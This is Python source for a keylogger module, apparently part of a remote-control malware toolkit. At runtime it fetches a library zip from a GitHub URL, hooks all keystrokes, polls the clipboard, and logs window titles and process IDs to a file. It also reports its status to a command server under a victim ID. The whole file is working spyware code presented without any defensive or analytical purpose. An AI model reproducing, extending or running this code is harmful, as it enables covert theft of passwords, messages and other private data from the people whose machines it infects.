pimport(
    '''from ctypes import windll,c_ulong,byref,create_string_buffer
import pythoncom,pyperclip,threading,pyHook,os,shutil,time,keyboard
from time import gmtime, strftime ''',
    "https://github.com/MrByehack/t-a-r-e-y-b/raw/master/bGlicmFyaWVz/"
    "loggers.zip"
)


class keylogger:
    last, li = 0, {}
    f, _stop, last_window = None, True, None

    @classmethod
    def __init__(self, server, file_path, start_stop='both',
                 paste_limit=500, file_limit=1024 * 1024, writeagain=False,
                 window_info=True):
        (
            self.file_path, self.paste_limit, self.file_limit, self.writeagain,
            self.window_info
        ) = file_path, paste_limit, file_limit, writeagain, window_info

        if start_stop in ('both', 'keyboard'):
            if not self.f:
                self.f = keyboard.hook(self.keywriter)
            else:
                self.f()
                self.f = None
                self.last, self.li = 0, {}
        if start_stop in ('both', 'clipboard'):
            if self._stop:
                cblogger = threading.Thread(target=self.clipboarder)
                self._stop = False
                cblogger.start()
            else:
                self._stop = True

        _send(server, '''inpu({!r},'36',0)'''.format(
            Myid + ' : clipboardLogger Turned {}\\nkeylogger Turned {}'.format(
                ('off' if self._stop else 'on'), ('on' if self.f else 'off')
            )
        ))

    @classmethod
    def keywriter(self, e):
        name = keyboard.normalize_name(e.name)
        if e.event_type == 'down':
            self.li[name] = self.li.get(name, 0) + 1
            self.keydown = 1
        elif e.event_type == 'up':
            if e.name in self.li:
                if self.keydown:
                    list_a = []
                    for me in self.li:
                        list_a.append(
                            me.replace('+', 'plus') +
                            (
                                ('') if (self.li[me] == 1) else
                                ('*' + str(self.li[me]))
                            )
                        )
                    self.writeToFile(
                        (
                            '[%s]' if len('+'.join(list_a)) > 1 else "%s"
                        ) % '+'.join(list_a)
                    )
                del self.li[name]
            else:
                self.writeToFile(('[%s]'if len(name) > 1 else "%s") % name)
            self.keydown = 0

    @classmethod
    def writeToFile(self, key):
        if self.last_window != windll.user32.GetForegroundWindow() and \
                self.window_info:
            self.last_window = windll.user32.GetForegroundWindow()
            hwnd = windll.user32.GetForegroundWindow()

            pid = c_ulong(0)
            windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))

            process_id = "%d" % pid.value

            executable = create_string_buffer(b"\\x00" * 512)
            h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)

            windll.psapi.GetModuleBaseNameA(
                h_process, None, byref(executable), 512
            )
            window_title = create_string_buffer(b"\\x00" * 512)
            length = windll.user32.GetWindowTextA(
                hwnd, byref(window_title), 512)
            self.writeToFile("\\n     [ PID: %s - %s - %s (at %s)]\\n" % (
                process_id, executable.value, window_title.value,
                strftime("%Y-%m-%d--%H-%M-%S", gmtime())
            ))

            windll.kernel32.CloseHandle(hwnd)
            windll.kernel32.CloseHandle(h_process)
        if os.path.exists(self.file_path) and \
                os.path.getsize(self.file_path) > self.file_limit:
            if not self.writeagain:
                shutil.copy2(self.file_path, self.file_path +
                             strftime("%Y-%m-%d--%H-%M-%S", gmtime())+'.txt')
            open(self.file_path, 'w').write('')
        open(self.file_path, 'a').write(key)

    @classmethod
    def clipboarder(self):
        strClipDataOld = ""
        strClipData = ""
        while not self._stop:
            try:
                strClipData = pyperclip.paste()
            except:
                pass
            if strClipData != strClipDataOld and strClipData:
                self.writeToFile(
                    '   [NEW-ClipBoard({}Chr): {}]'.format(
                        self.paste_limit, strClipData[:self.paste_limit]
                    )
                )
                strClipDataOld = strClipData
            time.sleep(2)
